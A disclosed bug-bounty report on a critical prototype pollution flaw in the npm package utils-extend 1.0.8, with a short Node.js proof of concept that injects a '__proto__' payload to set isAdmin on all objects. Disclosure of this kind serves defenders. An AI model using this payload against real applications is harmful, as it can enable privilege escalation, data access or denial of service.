# [utils-extend] Prototype pollution 

## Report Details
- **Report ID**: 801522
- **URL**: https://hackerone.com/reports/801522
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-02-21T07:35:31.190Z
- **Disclosed**: 2020-04-02T08:57:57.394Z

## Reporter
- **Username**: tuo4n8
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report `prototype polution` in `utils-extend`
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** utils-extend
**version:** 1.0.8
**npm page:** `https://www.npmjs.com/package/utils-extend`

## Module Description

> Extend nodejs util api, and it is light weight and simple.

## Module Stats

[1] weekly downloads : **129,956**

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:

1. npm install --save utils-extend
2. create file index.js with content :

```javascript
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

3. run `node index.js` => true 

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] : N
- I opened an issue in the related repository: [Y/N]  : N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

## Attachments
- demo.jpg
